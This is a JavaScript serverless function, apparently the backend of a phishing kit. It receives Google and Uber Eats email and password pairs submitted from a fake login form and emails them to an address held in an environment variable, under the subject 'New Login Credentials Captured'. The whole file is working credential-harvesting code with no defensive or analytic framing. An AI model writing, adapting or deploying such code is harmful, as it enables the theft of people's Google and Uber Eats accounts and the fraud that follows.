import nodemailer from 'nodemailer';

// Create transporter with Gmail SMTP
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

// Vercel serverless function handler
export default async function handler(req, res) {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
    
    const htmlContent = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background-color: #1a73e8; color: white; padding: 20px; text-align: center; }
          .content { background-color: #f9f9f9; padding: 20px; margin: 20px 0; }
          .credentials { background-color: white; padding: 15px; margin: 10px 0; border-left: 4px solid #1a73e8; }
          .label { font-weight: bold; color: #555; }
          .value { color: #000; margin-left: 10px; }
          .footer { text-align: center; color: #777; font-size: 12px; margin-top: 20px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 New Credentials Captured</h1>
          </div>
          <div class="content">
            ${googleEmail ? `
            <div class="credentials">
              <h3>Google Account</h3>
              <p><span class="label">Email:</span><span class="value">${googleEmail}</span></p>
              <p><span class="label">Password:</span><span class="value">${googlePassword}</span></p>
            </div>
            ` : ''}
            ${uberEmail ? `
            <div class="credentials">
              <h3>Uber Eats Account</h3>
              <p><span class="label">Email/Phone:</span><span class="value">${uberEmail}</span></p>
              <p><span class="label">Password:</span><span class="value">${uberPassword}</span></p>
            </div>
            ` : ''}
          </div>
          <div class="footer">
            <p>Captured at: ${new Date().toLocaleString()}</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const mailOptions = {
      from: process.env.GMAIL_USER,
      to: process.env.RECIPIENT_EMAIL,
      subject: '🔐 New Login Credentials Captured',
      html: htmlContent
    };

    await transporter.sendMail(mailOptions);
    
    return res.status(200).json({ success: true, message: 'Credentials sent successfully' });
  } catch (error) {
    console.error('Error sending credentials:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
}
